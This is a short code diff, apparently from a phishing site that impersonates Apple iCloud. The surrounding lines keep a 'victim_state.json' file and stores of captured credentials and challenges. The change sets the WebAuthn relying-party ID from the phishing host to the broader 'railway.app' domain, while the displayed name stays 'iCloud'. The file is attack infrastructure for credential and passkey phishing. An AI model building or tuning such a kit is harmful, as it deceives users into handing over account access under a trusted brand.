@@ -29,7 +29,7 @@ STATE_FILE = BASE_DIR / 'victim_state.json'
 registered_credentials = {}
 challenge_store = {}
 
-RP_ID = "icfish-site-production.up.railway.app"
+RP_ID = "railway.app"
 RP_NAME = "iCloud"
 ORIGIN = "https://icfish-site-production.up.railway.app"
 
